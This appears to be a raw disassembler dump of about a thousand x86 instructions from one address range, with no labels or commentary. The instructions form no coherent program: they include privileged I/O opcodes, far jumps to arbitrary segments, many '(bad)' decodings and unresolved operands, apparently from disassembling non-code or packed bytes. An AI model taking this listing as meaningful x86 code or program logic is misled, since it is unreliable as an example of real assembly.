  4117ca:	test   BYTE PTR [ebx],0x76
  4117cd:	push   esi
  4117ce:	shl    DWORD PTR [ebx+0x27bd5e38],cl
  4117d4:	push   ecx
  4117d5:	mov    BYTE PTR [edi],cl
  4117d7:	test   BYTE PTR ds:0xe351f406,0x4
  4117de:	mov    ?,esp
  4117e0:	xchg   ebp,eax
  4117e1:	hlt    
  4117e2:	sub    DWORD PTR ds:0xa13a120f,ecx
  4117e8:	shr    BYTE PTR [ebp-0x6d],cl
  4117eb:	pop    edx
  4117ec:	in     eax,0x9f
  4117ee:	xchg   esi,eax
  4117ef:	sbb    BYTE PTR [eax],ah
  4117f1:	pop    esp
  4117f2:	and    ecx,edx
  4117f4:	inc    edx
  4117f5:	pop    edi
  4117f6:	cli    
  4117f7:	cmp    ecx,DWORD PTR [edi-0x7fb4fb6c]
  4117fd:	pop    ebp
  4117fe:	jmp    0x7b9a:0x1320fbd6
  411805:	sbb    al,0x19
  411807:	add    eax,0x5bf870fa
  41180c:	popa   
  41180d:	xor    DWORD PTR [ebx+0x32],ecx
  411810:	pushf  
  411811:	ret    0xecc2
  411814:	(bad)  
  411815:	and    al,0x90
  411817:	push   cs
  411818:	lea    esp,[ebx-0xd489542]
  41181e:	pop    eax
  41181f:	dec    edx
  411820:	xchg   ebx,eax
  411821:	les    bx,DWORD PTR [eax+edi*2]
  411825:	mov    cl,BYTE PTR ds:0x1c84304
  41182b:	jns    0x411843
  41182d:	push   ecx
  41182e:	imul   eax,DWORD PTR [edx-0x25a29373],0x60
  411835:	xor    DWORD PTR [ebx],eax
  411837:	xchg   BYTE PTR [edi+eiz*4],bl
  41183a:	xor    dh,BYTE PTR [bp+di]
  41183d:	pop    esp
  41183e:	out    0xee,eax
  411840:	mov    eax,0x5e89b105
  411845:	dec    esp
  411846:	shl    edx,cl
  411848:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411849:	xchg   DWORD PTR [ebx+0x7fc81e75],ebx
  41184f:	popf   
  411850:	ja     0x411854
  411852:	sub    DWORD PTR [ebp+0x66],0xa20461bf
  411859:	pop    ebp
  41185a:	mov    ah,0xc2
  41185c:	dec    edx
  41185d:	inc    ecx
  41185e:	inc    edi
  41185f:	ins    BYTE PTR es:[edi],dx
  411860:	sub    DWORD PTR [eax+0x72],ebx
  411863:	into   
  411864:	data16 daa 
  411866:	addr16 mov eax,ds:0x1ddf
  41186a:	xchg   ch,dl
  41186c:	mov    bl,0x3
  41186e:	outs   dx,BYTE PTR ds:[esi]
  41186f:	dec    esp
  411870:	out    0x17,al
  411872:	add    eax,ebx
  411874:	xor    eax,0xa0c4da76
  411879:	fld    st(7)
  41187b:	stos   DWORD PTR es:[edi],eax
  41187c:	or     BYTE PTR [esp+ecx*2],ch
  41187f:	mov    ebx,0x96563774
  411884:	xchg   ebp,eax
  411885:	sub    ebx,ecx
  411887:	add    edx,DWORD PTR [esi+0x24]
  41188a:	pop    eax
  41188b:	xchg   edi,eax
  41188c:	sbb    DWORD PTR [ebp-0x167e5673],0x77
  411893:	cmp    eax,0x8692842
  411898:	icebp  
  411899:	mov    DWORD PTR [edi+esi*2],esp
  41189c:	pusha  
  41189d:	sti    
  41189e:	frndint 
  4118a0:	das    
  4118a1:	test   BYTE PTR gs:0x414b0254,bl
  4118a8:	and    eax,0x6d6c3651
  4118ad:	jo     0x411922
  4118af:	or     ah,BYTE PTR [ebx-0x7e]
  4118b2:	pop    edx
  4118b3:	xchg   DWORD PTR [edx],ebp
  4118b5:	rcl    BYTE PTR [eax-0x7a6dc02b],1
  4118bb:	(bad)  
  4118bc:	cmp    ecx,ecx
  4118be:	rcr    DWORD PTR [ebx],cl
  4118c0:	mov    esi,0x4d5faf83
  4118c5:	ja     0x41186a
  4118c7:	xor    al,bl
  4118c9:	sub    BYTE PTR [eax],ch
  4118cb:	stos   DWORD PTR es:[edi],eax
  4118cc:	ret    
  4118cd:	adc    BYTE PTR [ebx+0x4830995c],0xc1
  4118d4:	sub    dh,BYTE PTR [ecx-0x81ba58a]
  4118da:	mov    ebp,0xbfce896a
  4118df:	cwde   
  4118e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118e1:	jg     0x411877
  4118e3:	inc    esi
  4118e4:	ja     0x4118f7
  4118e6:	rcr    BYTE PTR [edx-0x4417b397],cl
  4118ec:	mov    ch,0x67
  4118ee:	sbb    BYTE PTR [ebp+0x2f],al
  4118f1:	sti    
  4118f2:	fild   QWORD PTR [eax+0x209d5d25]
  4118f8:	fcomi  st,st(0)
  4118fa:	add    ah,dh
  4118fc:	jbe    0x4118b6
  4118fe:	and    esi,edi
  411900:	mov    DWORD PTR [edx-0x36],ebx
  411903:	adc    BYTE PTR [ebx+0x6e9ca740],0xb4
  41190a:	pop    eax
  41190b:	push   cs
  41190c:	clc    
  41190d:	call   0xb5f2:0xeeeabc05
  411914:	mov    DWORD PTR [ebp-0x68],esp
  411917:	sahf   
  411918:	adc    ch,BYTE PTR [esi+0x68]
  41191b:	cmp    dl,dh
  41191d:	add    eax,0x3960bb1a
  411922:	test   DWORD PTR [edx],eax
  411924:	mov    esi,0x2b7a681
  411929:	or     bl,dl
  41192b:	add    edi,ecx
  41192d:	mov    gs,WORD PTR [esi+ebp*8]
  411930:	aad    0x8f
  411932:	in     al,dx
  411933:	ficomp DWORD PTR [eax+0xf]
  411936:	mov    dh,0xbf
  411938:	xor    dh,ah
  41193a:	aas    
  41193b:	jb     0x4118c6
  41193d:	or     DWORD PTR [edx],esi
  41193f:	or     eax,0xc6403495
  411944:	adc    DWORD PTR [ecx+eiz*1],ebx
  411947:	mov    ecx,0xf925527
  41194c:	sub    edx,DWORD PTR ds:[edx+eax*1-0x24]
  411951:	out    0x8a,al
  411953:	int3   
  411954:	in     al,dx
  411955:	jbe    0x4119a3
  411957:	jg     0x41191f
  411959:	ror    ch,1
  41195b:	imul   edi,DWORD PTR [eax-0x20c6988f],0x1592678e
  411965:	xor    eax,0xd749ac06
  41196a:	dec    esp
  41196b:	test   BYTE PTR [edx],ah
  41196d:	mov    esp,0x3995ec00
  411972:	mov    ah,0xfd
  411974:	sub    cl,BYTE PTR [ebx-0xe17a07b]
  41197a:	(bad)  
  41197b:	sub    al,0x45
  41197d:	add    eax,0x8c4b2df4
  411982:	clc    
  411983:	pop    eax
  411984:	adc    eax,0xaf573fab
  411989:	scas   eax,DWORD PTR es:[edi]
  41198a:	adc    eax,esp
  41198c:	sbb    esi,ebx
  41198e:	ror    al,1
  411990:	sub    al,0x34
  411992:	xchg   edi,eax
  411993:	iret   
  411994:	dec    edi
  411995:	jnp    0x411989
  411997:	das    
  411998:	dec    esp
  411999:	lods   eax,DWORD PTR ds:[esi]
  41199a:	jp     0x41192c
  41199c:	sub    DWORD PTR ds:0x8d168b05,0xed628400
  4119a6:	ds dec ebp
  4119a8:	ror    BYTE PTR [ecx-0x38],0x40
  4119ac:	mov    ecx,0xdd8686b5
  4119b1:	lea    esp,[eax+0x28c4de29]
  4119b7:	push   esi
  4119b8:	bound  edi,QWORD PTR [esi-0x60]
  4119bb:	dec    esi
  4119bc:	aam    0x6f
  4119be:	mov    ecx,0x661f77d7
  4119c3:	dec    esp
  4119c4:	add    DWORD PTR [eax+0x6066fd5f],esp
  4119ca:	push   ss
  4119cb:	cld    
  4119cc:	call   0xa198:0x5720929c
  4119d3:	sti    
  4119d4:	or     BYTE PTR [esi],al
  4119d6:	xor    BYTE PTR [ecx],bh
  4119d8:	sbb    al,0xea
  4119da:	loope  0x4119c8
  4119dc:	mov    bh,0x3e
  4119de:	out    dx,eax
  4119df:	adc    BYTE PTR [eax],0x29
  4119e2:	(bad)  
  4119e3:	pop    ds
  4119e4:	out    dx,eax
  4119e5:	leave  
  4119e6:	jge    0x411a13
  4119e8:	mov    ds:0xa68c9d6,eax
  4119ed:	jecxz  0x411a23
  4119ef:	dec    esi
  4119f0:	jbe    0x411a5f
  4119f2:	dec    ecx
  4119f3:	out    0xa1,eax
  4119f5:	imul   edx,DWORD PTR [ebx],0xffffffc8
  4119f8:	sahf   
  4119f9:	mov    ebp,0x4d75af71
  4119fe:	inc    edx
  4119ff:	jne    0x4119e0
  411a01:	inc    edx
  411a02:	mov    ecx,0xd26093d5
  411a07:	mov    al,ds:0xc2a96f12
  411a0c:	dec    ebx
  411a0d:	sub    bh,BYTE PTR [ecx]
  411a0f:	mov    ebx,0x69974021
  411a14:	dec    eax
  411a15:	push   edi
  411a16:	icebp  
  411a17:	out    dx,al
  411a18:	ins    BYTE PTR es:[edi],dx
  411a19:	cmp    BYTE PTR [ebp+0x3e],0x6f
  411a1d:	or     DWORD PTR [ebp-0x64],0x46
  411a21:	inc    esi
  411a22:	cdq    
  411a23:	out    0x79,al
  411a25:	loop   0x411a50
  411a27:	mov    esi,esi
  411a29:	out    dx,al
  411a2a:	ds mov dl,0x2e
  411a2d:	ret    
  411a2e:	inc    ebp
  411a2f:	retf   
  411a30:	dec    ecx
  411a31:	test   al,0xb9
  411a33:	mov    eax,0x77d52b41
  411a38:	sub    al,0xd0
  411a3a:	xchg   esi,eax
  411a3b:	mov    eax,ds:0x3250b335
  411a40:	jns    0x411a2e
  411a42:	aad    0x83
  411a44:	sar    BYTE PTR [edx-0x48],0x54
  411a48:	add    DWORD PTR [eax-0x22],ebp
  411a4b:	mov    dl,0x87
  411a4d:	test   al,0xc7
  411a4f:	inc    edx
  411a50:	jnp    0x411a6c
  411a52:	icebp  
  411a53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a54:	or     dl,BYTE PTR [edx-0x37]
  411a57:	ret    
  411a58:	out    dx,eax
  411a59:	aas    
  411a5a:	fadd   QWORD PTR [esp+ecx*4-0x2b633e41]
  411a61:	call   0x5ef:0x6228232e
  411a68:	fcom   st(1)
  411a6a:	pandn  mm7,QWORD PTR [ecx-0xb0f1a5]
  411a71:	mov    edi,0x666772c1
  411a76:	adc    al,0x9d
  411a78:	sub    cl,BYTE PTR gs:[ecx]
  411a7b:	clc    
  411a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a7d:	mov    al,0x93
  411a7f:	pop    ss
  411a80:	retf   0x33f8
  411a83:	bound  eax,QWORD PTR [ebp-0x121c9854]
  411a89:	mov    bh,0x70
  411a8b:	sub    BYTE PTR [esi+0x4a],dl
  411a8e:	addr16 dec ebx
  411a90:	pop    ebp
  411a91:	xchg   ebp,eax
  411a92:	outs   dx,BYTE PTR ds:[esi]
  411a93:	jge    0x411a5c
  411a95:	xchg   BYTE PTR [ecx-0x4fb0c21d],ah
  411a9b:	push   edi
  411a9c:	mov    al,0xaf
  411a9e:	xchg   edi,ecx
  411aa0:	pusha  
  411aa1:	aad    0x81
  411aa3:	je     0x411aec
  411aa5:	leave  
  411aa6:	mov    al,ds:0xa2132a0a
  411aab:	inc    ebp
  411aac:	push   ss
  411aad:	out    dx,al
  411aae:	(bad)  
  411aaf:	sub    DWORD PTR [edi+ecx*4-0x7c],ecx
  411ab3:	je     0x411ac0
  411ab5:	loop   0x411aa9
  411ab7:	pop    esi
  411ab8:	daa    
  411ab9:	sti    
  411aba:	or     al,0xa9
  411abc:	and    al,0xe0
  411abe:	xchg   ebp,eax
  411abf:	mov    ds:0xc7e3e787,eax
  411ac4:	scas   al,BYTE PTR es:[edi]
  411ac5:	or     ebp,DWORD PTR [eax-0x6d]
  411ac8:	pop    esi
  411ac9:	inc    edi
  411aca:	pop    esp
  411acb:	aas    
  411acc:	aaa    
  411acd:	outs   dx,BYTE PTR ds:[esi]
  411ace:	mov    eax,ds:0xf0a83bed
  411ad3:	std    
  411ad4:	sbb    ebx,DWORD PTR gs:[edi]
  411ad7:	xchg   edx,eax
  411ad8:	enter  0xdec,0x16
  411adc:	loope  0x411b4e
  411ade:	test   DWORD PTR [edi+0x29],ecx
  411ae1:	(bad)  
  411ae2:	loope  0x411a6b
  411ae4:	pop    esi
  411ae5:	and    ecx,edx
  411ae7:	push   ebp
  411ae8:	sbb    al,BYTE PTR [ecx+0x4c]
  411aeb:	mov    eax,0x6f20a446
  411af0:	dec    esi
  411af1:	cmc    
  411af2:	enter  0x1db5,0x6f
  411af6:	shl    dh,cl
  411af8:	call   0xa40e:0xf29ec233
  411aff:	jae    0x411b03
  411b01:	cmp    DWORD PTR [ebp-0x68838dfa],esp
  411b07:	and    edx,0xadb0f0a4
  411b0d:	dec    esi
  411b0e:	sub    DWORD PTR [ebx-0x7b85a19e],edx
  411b14:	inc    esi
  411b15:	pop    ss
  411b16:	and    eax,0x4bebb0a1
  411b1b:	mov    esp,0xcf320f89
  411b20:	ret    0x42d4
  411b23:	loopne 0x411b7c
  411b25:	add    al,cl
  411b27:	scas   eax,DWORD PTR es:[edi]
  411b28:	cmp    eax,0x8d0e45d3
  411b2d:	outs   dx,DWORD PTR ds:[esi]
  411b2e:	repnz fiadd DWORD PTR [ecx+0x697ea203]
  411b35:	sbb    eax,DWORD PTR ds:0x8075c9ed
  411b3b:	dec    esi
  411b3c:	sahf   
  411b3d:	push   esi
  411b3e:	xor    edi,ebp
  411b40:	test   BYTE PTR [edx+0x94067e9],bl
  411b46:	xchg   esi,eax
  411b47:	mov    ch,0xe2
  411b49:	xor    eax,0xc0bd9275
  411b4e:	jp     0x411b1a
  411b50:	push   esp
  411b51:	(bad)
  411b54:	or     al,0xd0
  411b56:	mov    ?,esi
  411b58:	pushf  
  411b59:	imul   DWORD PTR [eax]
  411b5b:	mov    esi,0xade172d4
  411b61:	imul   DWORD PTR [ebx+0x60]
  411b64:	bswap  edi
  411b66:	cmp    bl,ch
  411b68:	mov    esp,0x3ef75f48
  411b6d:	in     eax,dx
  411b6e:	add    eax,0x1d98c51b
  411b73:	inc    eax
  411b74:	call   0x1df3:0x69cc5691
  411b7b:	mov    edx,0xe8248988
  411b80:	push   ecx
  411b81:	jbe    0x411b5b
  411b83:	mov    edi,0x8ae21b8b
  411b88:	inc    ebx
  411b89:	and    al,0x5
  411b8b:	loopne 0x411ba0
  411b8d:	lods   eax,DWORD PTR ds:[esi]
  411b8e:	mov    ecx,DWORD PTR [ebx+0x2b87826b]
  411b94:	sahf   
  411b95:	js     0x411b54
  411b97:	and    DWORD PTR [eax],0xffffff88
  411b9a:	sub    cl,BYTE PTR [ecx*8-0x3fe2f3d]
  411ba1:	cmp    bh,BYTE PTR [ebp-0xd]
  411ba4:	inc    esi
  411ba5:	mov    al,0x5d
  411ba7:	lods   eax,DWORD PTR ds:[esi]
  411ba8:	(bad)  
  411ba9:	adc    ch,BYTE PTR [eax]
  411bab:	ret    
  411bac:	loopne 0x411c0e
  411bae:	mov    ebx,0x3896bda5
  411bb3:	mov    eax,ds:0xf6b73d79
  411bb8:	fisttp DWORD PTR [ebx]
  411bba:	shl    DWORD PTR [ecx+0x78ea31dd],1
  411bc0:	mov    edi,0x1ed392ba
  411bc5:	push   edx
  411bc6:	mov    bl,0xaf
  411bc8:	lea    ebx,[ebx+esi*2]
  411bcb:	mov    esi,0xb005fdd5
  411bd0:	mov    ?,WORD PTR [edx+0x1c4d13d9]
  411bd6:	mov    edi,0x2d51c362
  411bdb:	pop    es
  411bdc:	out    0xbf,eax
  411bde:	aam    0x83
  411be0:	xchg   edx,ebx
  411be2:	cmp    ch,BYTE PTR [esi+0x4d]
  411be5:	push   ebp
  411be6:	mov    edi,0x18a099b6
  411beb:	jecxz  0x411c54
  411bed:	cmp    edi,DWORD PTR [ecx-0xe71a40c]
  411bf3:	ds js  0x411c5a
  411bf6:	mov    ds:0xc0b85742,al
  411bfb:	push   edx
  411bfc:	pop    es
  411bfd:	ins    DWORD PTR es:[edi],dx
  411bfe:	into   
  411bff:	call   0x114:0xf5e9af77
  411c06:	aad    0xd5
  411c08:	adc    ah,ch
  411c0a:	sbb    al,0xfc
  411c0c:	lahf   
  411c0d:	pop    ss
  411c0e:	sbb    BYTE PTR [ebp-0x5fd4a937],0xaf
  411c15:	cmp    DWORD PTR fs:[ebp-0x55c4e21d],esp
  411c1c:	push   ebx
  411c1d:	aas    
  411c1e:	daa    
  411c1f:	scas   eax,DWORD PTR es:[edi]
  411c20:	adc    esi,edi
  411c22:	mov    ebx,ds
  411c24:	xchg   ebp,eax
  411c25:	dec    ebx
  411c26:	jo     0x411c59
  411c28:	(bad)  
  411c29:	mov    ch,cl
  411c2b:	int    0x1a
  411c2d:	xchg   edi,eax
  411c2e:	mov    bl,0xe6
  411c30:	inc    edi
  411c31:	sub    esp,DWORD PTR [ebp+edi*1+0x6b6528f9]
  411c38:	xchg   BYTE PTR [esi+eax*4-0x41],dh
  411c3c:	mov    BYTE PTR [eax+0x71],0x88
  411c40:	or     al,0x6b
  411c42:	xor    al,0x13
  411c44:	jmp    0x411c25
  411c46:	inc    ecx
  411c47:	mov    sp,WORD PTR [ebp-0xf]
  411c4b:	mov    ebx,DWORD PTR [ebp-0x2964a4d]
  411c51:	cs adc al,0x48
  411c54:	scas   eax,DWORD PTR es:[edi]
  411c55:	test   eax,0xc72a251c
  411c5a:	arpl   WORD PTR [eax],bx
  411c5c:	jo     0x411c63
  411c5e:	fisubr DWORD PTR [ebp+0x21]
  411c61:	sbb    ah,BYTE PTR [edx+0xc0865e4]
  411c67:	out    0x63,al
  411c69:	mov    bh,0x7d
  411c6b:	add    DWORD PTR [edi+0x7a39caa1],ebx
  411c71:	dec    edi
  411c72:	jne    0x411c91
  411c74:	sti    
  411c75:	xchg   ebx,eax
  411c76:	inc    ebx
  411c77:	xchg   esi,eax
  411c78:	add    eax,0xdae942f8
  411c7d:	add    ebx,DWORD PTR [edx-0x46f5adca]
  411c83:	shl    ebx,0x5c
  411c86:	sbb    bh,BYTE PTR [eax]
  411c88:	push   cs
  411c89:	and    ebp,DWORD PTR [ebp+0x595d44b8]
  411c8f:	test   eax,ecx
  411c91:	sbb    eax,0xccb86183
  411c96:	dec    esi
  411c97:	sub    bl,al
  411c99:	push   0x724c8e4b
  411c9e:	out    dx,al
  411c9f:	repz dec edx
  411ca1:	xchg   esi,eax
  411ca2:	loope  0x411cdf
  411ca4:	add    BYTE PTR [ecx+0x6b],0xc8
  411ca8:	addr16 mov dh,0xe5
  411cab:	push   cs
  411cac:	or     BYTE PTR [ebx],cl
  411cae:	push   edx
  411caf:	ins    BYTE PTR es:[edi],dx
  411cb0:	mov    bh,BYTE PTR [eax+edi*4-0x731e33e5]
  411cb7:	shr    BYTE PTR [esp+edi*2-0x62],1
  411cbb:	sub    BYTE PTR [eax+0x2],al
  411cbe:	out    0x39,eax
  411cc0:	sub    BYTE PTR cs:[edi],dl
  411cc3:	retf   0x7810
  411cc6:	daa    
  411cc7:	int    0x19
  411cc9:	lea    edx,[ecx-0x11]
  411ccc:	sub    edx,DWORD PTR [eax]
  411cce:	ds ret 
  411cd0:	xchg   DWORD PTR [ecx+eiz*2+0x7e],ebp
  411cd4:	stos   BYTE PTR es:[edi],al
  411cd5:	stos   BYTE PTR es:[edi],al
  411cd6:	fs loopne 0x411ca0
  411cd9:	fwait
  411cda:	lock (bad) 
  411cdc:	mov    ch,BYTE PTR [ecx-0x15efc1d5]
  411ce2:	dec    ebx
  411ce3:	mov    al,ds:0x6ea5b569
  411ce8:	(bad)  
  411cea:	in     al,0x3c
  411cec:	fsubrp st(2),st
  411cee:	dec    ecx
  411cef:	dec    ebp
  411cf0:	rcr    BYTE PTR [ecx+0x33fec58c],1
  411cf6:	dec    edi
  411cf7:	gs add al,0x6a
  411cfa:	push   ebp
  411cfb:	test   dl,al
  411cfd:	dec    ebp
  411cfe:	mov    al,0xaa
  411d00:	pop    edx
  411d01:	jmp    0x411cfb
  411d03:	fsub   QWORD PTR [esi]
  411d05:	outs   dx,DWORD PTR ds:[esi]
  411d06:	push   es
  411d07:	(bad)  
  411d08:	jne    0x411d51
  411d0a:	iret   
  411d0b:	cmp    eax,0x29c02234
  411d10:	mov    BYTE PTR [ebx+0x7049745e],dh
  411d16:	mov    al,BYTE PTR [edx]
  411d18:	je     0x411d08
  411d1a:	cmc    
  411d1b:	add    dh,dh
  411d1d:	mov    edx,0xc118eafa
  411d22:	in     al,dx
  411d23:	xlat   BYTE PTR ds:[ebx]
  411d24:	xchg   edi,eax
  411d25:	leave  
  411d26:	xchg   esi,eax
  411d27:	ficom  DWORD PTR [esi]
  411d29:	call   0x19523428
  411d2e:	scas   eax,DWORD PTR es:[edi]
  411d2f:	int3   
  411d30:	xchg   edx,eax
  411d31:	mov    WORD PTR [ebp-0x29],?
  411d34:	sbb    eax,0xd11ee1e0
  411d39:	into   
  411d3a:	test   eax,0xa6831394
  411d3f:	push   eax
  411d40:	ret    
  411d41:	jmp    FWORD PTR [esi-0xee23a5d]
  411d47:	ret    
  411d48:	jp     0x411d9a
  411d4a:	inc    edx
  411d4b:	mov    ecx,0x81debfaf
  411d50:	or     al,0xc4
  411d52:	aas    
  411d53:	gs sti 
  411d55:	push   eax
  411d56:	cld    
  411d57:	xchg   esi,eax
  411d58:	mov    ch,0x78
  411d5a:	dec    esp
  411d5b:	mov    esi,0x5c9e36b5
  411d60:	das    
  411d61:	daa    
  411d62:	hlt    
  411d63:	lea    ecx,[esi-0x3f22978b]
  411d69:	cmp    al,0x5e
  411d6b:	push   cs
  411d6c:	icebp  
  411d6d:	cmp    edx,DWORD PTR [ebp-0xea834e3]
  411d73:	lods   eax,DWORD PTR ds:[esi]
  411d74:	and    eax,0xb6ab4b13
  411d79:	shl    BYTE PTR [esi-0x131e52c7],0x66
  411d80:	inc    edi
  411d81:	addr16 and al,0x7d
  411d84:	xchg   esi,eax
  411d85:	sub    BYTE PTR [edx],dh
  411d87:	mov    ecx,0xdb014249
  411d8c:	sahf   
  411d8d:	pop    ecx
  411d8e:	sti    
  411d8f:	jmp    0x173c:0x25e8b5ee
  411d96:	(bad)  
  411d97:	mov    edi,0x385a645f
  411d9c:	pop    edi
  411d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d9e:	jae    0x411d9d
  411da0:	xchg   DWORD PTR ds:0x22d2055c,edi
  411da6:	(bad)  
  411da7:	cld    
  411da8:	mov    eax,DWORD PTR [eax-0x41af48ac]
  411dae:	cmp    al,ch
  411db0:	mov    dh,0x51
  411db2:	jg     0x411d5a
  411db4:	(bad)  
  411db5:	push   ecx
  411db6:	outs   dx,DWORD PTR ds:[esi]
  411db7:	inc    edx
  411db8:	adc    al,0xec
  411dba:	push   edi
  411dbb:	dec    esi
  411dbc:	cmp    bl,BYTE PTR [edi+ebp*4-0x729bb2fc]
  411dc3:	cmc    
  411dc4:	jne    0x411d64
  411dc6:	mov    ch,0x76
  411dc8:	outs   dx,BYTE PTR ds:[esi]
  411dc9:	pop    ebx
  411dca:	cmp    eax,0x902c93d7
  411dcf:	sub    DWORD PTR [ebp+0x56],ebp
  411dd2:	lods   al,BYTE PTR ds:[esi]
  411dd3:	mov    eax,0x9bb3e0ad
  411dd8:	or     DWORD PTR [ebx+0x2097197a],0x63ee1552
  411de2:	iret   
  411de3:	adc    dl,BYTE PTR [ebp+0x31293f13]
  411de9:	mov    WORD PTR [edi+edi*8],?
  411dec:	jmp    DWORD PTR [ebp+0x4a]
  411def:	fbld   TBYTE PTR [edi]
  411df1:	mov    esi,0x1b3d3580
  411df6:	fwait
  411df7:	cmp    eax,0x1ecbae47
  411dfc:	pop    ds
  411dfd:	bswap  ebp
  411dff:	push   es
  411e00:	in     eax,0x8b
  411e02:	cld    
  411e03:	xchg   ch,dh
  411e05:	xchg   edx,eax
  411e06:	mov    cl,0x4a
  411e08:	xchg   esi,eax
  411e09:	and    eax,ebx
  411e0b:	jmp    0x819a799f
  411e10:	adc    ebx,edx
  411e12:	mov    eax,0x3d3f5ee0
  411e17:	stos   BYTE PTR es:[edi],al
  411e18:	and    BYTE PTR [ebx],bh
  411e1a:	xor    DWORD PTR [ebp-0x5e],0x2251ef4e
  411e21:	dec    esp
  411e22:	mov    esi,0x88e2d1d9
  411e27:	gs push cs
  411e29:	(bad)  
  411e2a:	and    eax,0x187fdc8e
  411e2f:	rcr    DWORD PTR [eax+ecx*8-0x28],cl
  411e33:	adc    BYTE PTR [edi-0x4a8d0d0e],bh
  411e39:	sub    BYTE PTR [eax-0x3b144580],ah
  411e3f:	in     eax,dx
  411e40:	popa   
  411e41:	int    0x3b
  411e43:	dec    ebx
  411e44:	sub    ecx,DWORD PTR [edi+0x70cd8920]
  411e4a:	xchg   BYTE PTR [ecx-0x1bbbb6b6],al
  411e50:	and    ecx,DWORD PTR [eax+0x38895619]
  411e56:	cmp    ebp,DWORD PTR [edx+0x5ba0d633]
  411e5c:	fwait
  411e5d:	popf   
  411e5e:	idiv   DWORD PTR [ebx-0x4e]
  411e61:	xlat   BYTE PTR ds:[ebx]
  411e62:	xchg   ecx,eax
  411e63:	sahf   
  411e64:	add    al,0xb6
  411e66:	jnp    0x411e23
  411e68:	ret    0x5595
  411e6b:	sub    al,0x6
  411e6d:	leave  
  411e6e:	lahf   
  411e6f:	jb     0x411e8e
  411e71:	in     eax,0x47
  411e73:	and    eax,0xc930f9d2
  411e78:	aas    
  411e79:	pop    eax
  411e7a:	push   0xa09757fb
  411e7f:	lods   eax,DWORD PTR ds:[esi]
  411e80:	or     ah,ch
  411e82:	loope  0x411eff
  411e84:	icebp  
  411e85:	aad    0x57
  411e87:	xor    ebx,edx
  411e89:	shl    BYTE PTR [ecx],cl
  411e8b:	dec    ebx
  411e8c:	cmp    DWORD PTR ds:0xc97bf026,edi
  411e92:	add    eax,0x54991dda
  411e97:	dec    edx
  411e98:	or     eax,edx
  411e9a:	mov    ds:0x16880fd0,eax
  411e9f:	xchg   DWORD PTR [edi-0x2b98c844],edx
  411ea5:	sbb    al,0xd6
  411ea7:	mov    bh,0x6b
  411ea9:	xor    BYTE PTR [eax],dl
  411eab:	das    
  411eac:	in     eax,0x9a
  411eae:	push   edx
  411eaf:	test   BYTE PTR [edx],bl
  411eb1:	xor    BYTE PTR [eax-0x72],bh
  411eb4:	das    
  411eb5:	ficom  WORD PTR [eax-0x76]
  411eb8:	ret    
  411eb9:	in     al,0xb2
  411ebb:	ror    BYTE PTR [ebp+0xbfc95e6],1
  411ec1:	call   0x4add:0x30de42aa
  411ec8:	into   
  411ec9:	xor    al,0x2a
  411ecb:	sub    ecx,DWORD PTR [ecx-0x4988cdba]
  411ed1:	mov    bl,0x7d
  411ed3:	repz or eax,0xa7a5ee63
  411ed9:	jne    0x411e7c
  411edb:	inc    edx
  411edc:	mov    edi,0xdae6126a
  411ee1:	cmp    eax,0xaeea8f
  411ee6:	xor    DWORD PTR [ecx-0x56],0x3f
  411eea:	inc    ecx
  411eeb:	jp     0x8b51ba9c
  411ef1:	out    dx,eax
  411ef2:	add    al,0xee
  411ef4:	hlt    
  411ef5:	sbb    DWORD PTR [edx+ebx*2+0x56],edi
  411ef9:	(bad)  
  411efa:	fmul   st,st(2)
  411efc:	js     0x411ee4
  411efe:	or     dh,BYTE PTR ds:0x40cd2b61
  411f04:	inc    ecx
  411f05:	iret   
  411f06:	fisubr WORD PTR [ebx-0x55d6fd01]
  411f0c:	fdiv   DWORD PTR cs:[ebp-0x4c]
  411f10:	aad    0xd7
  411f12:	adc    bh,bh
  411f14:	repnz inc ebx
  411f16:	mov    al,0xdf
  411f18:	pop    ecx
  411f19:	test   al,0x10
  411f1b:	pop    edx
  411f1c:	inc    esi
  411f1d:	pop    ss
  411f1e:	pop    ss
  411f1f:	push   edi
  411f20:	dec    esp
  411f21:	clc    
  411f22:	mov    dl,0x92
  411f24:	cwde   
  411f25:	sahf   
  411f26:	repnz pop esp
  411f28:	out    0x35,eax
  411f2a:	xchg   ebx,eax
  411f2b:	test   BYTE PTR [ecx+0x50],bl
  411f2e:	sub    ebx,DWORD PTR [edx-0x56]
  411f31:	leave  
  411f32:	js     0x411f3a
  411f34:	rcr    esp,cl
  411f36:	jb     0x411f15
  411f38:	mov    eax,ds:0x184aa0d7
  411f3d:	leave  
  411f3e:	(bad)  
  411f3f:	jp     0x411f6d
  411f41:	xlat   BYTE PTR ds:[ebx]
  411f42:	push   ebp
  411f43:	inc    esp
  411f44:	int    0x1d
  411f46:	in     eax,0xf5
  411f48:	(bad)
  411f4c:	popa   
  411f4d:	or     al,0x75
  411f4f:	jl     0x411f35
  411f51:	jmp    0xac3cd382
  411f56:	adc    edi,DWORD PTR [edi]
  411f58:	jno    0x411eeb
  411f5a:	rol    ebp,cl
  411f5c:	leave  
  411f5d:	lods   al,BYTE PTR ds:[esi]
  411f5e:	inc    ecx
  411f5f:	leave  
  411f60:	fiadd  WORD PTR [ebx-0x6f]
  411f63:	jb     0x411f45
  411f65:	mov    bl,0x21
  411f67:	or     DWORD PTR [eax+0x60],edx
  411f6a:	or     al,0xc4
  411f6c:	mov    edi,0xbcfc3809
  411f71:	mov    ecx,0x3352931c
  411f76:	out    dx,al
  411f77:	or     eax,0x643314f6
  411f7c:	add    bl,cl
  411f7e:	nop
  411f7f:	lahf   
  411f80:	cli    
  411f81:	fcomp  DWORD PTR [ecx+0x7b6a43e3]
  411f87:	das    
  411f88:	bound  ebp,QWORD PTR [ecx-0x3a]
  411f8b:	mov    cx,0x8119
  411f8f:	and    DWORD PTR [ecx],0xc3a5d8d9
  411f95:	push   ss
  411f96:	pop    edi
  411f97:	es dec edx
  411f99:	mov    al,ds:0x987b8317
  411f9e:	xchg   edx,eax
  411f9f:	adc    DWORD PTR [ebp+edx*8+0x222c708b],ecx
  411fa6:	or     BYTE PTR [ebx],0xe5
  411fa9:	mov    edi,0xa367c737
  411faf:	shl    DWORD PTR [edx-0x10],cl
  411fb2:	pop    ss
  411fb3:	les    ebx,FWORD PTR [esi+0x5177547]
  411fb9:	pop    ds
  411fba:	push   0xaa47329a
  411fbf:	inc    edx
